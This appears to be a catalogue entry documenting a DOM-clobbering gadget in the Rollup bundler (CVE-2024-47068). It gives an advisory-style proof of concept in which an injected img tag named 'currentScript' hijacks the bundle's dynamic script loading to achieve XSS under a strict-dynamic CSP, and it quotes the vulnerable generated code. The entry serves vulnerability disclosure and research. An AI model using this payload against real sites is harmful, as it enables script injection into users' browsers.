---
description: Next-generation ES module bundler 
github: rollup/rollup
gadgets:
  <4.22.4:
    cve: CVE-2024-47068 
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - firefox-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: As with [Webpack](https://github.com/webpack/webpack), modules were loaded dynamically using the `document.currentScript.src` path, which can be clobbered.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/">

          <script nonce="secret" src="[current-location]/assets/libs/rollup/bundle.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/rollup/rollup/blob/v4.22.3/test/form/samples/import-meta/_expected/cjs.js">https://github.com/rollup/rollup/blob/v4.22.3/test/form/samples/import-meta/_expected/cjs.js</a>

      ```javascript
      var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
      var s = document.createElement('script');
      s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
      document.head.append(s);
      ```
    links:
      - https://github.com/advisories/GHSA-gcx4-mw62-g8wm
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/rollup.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
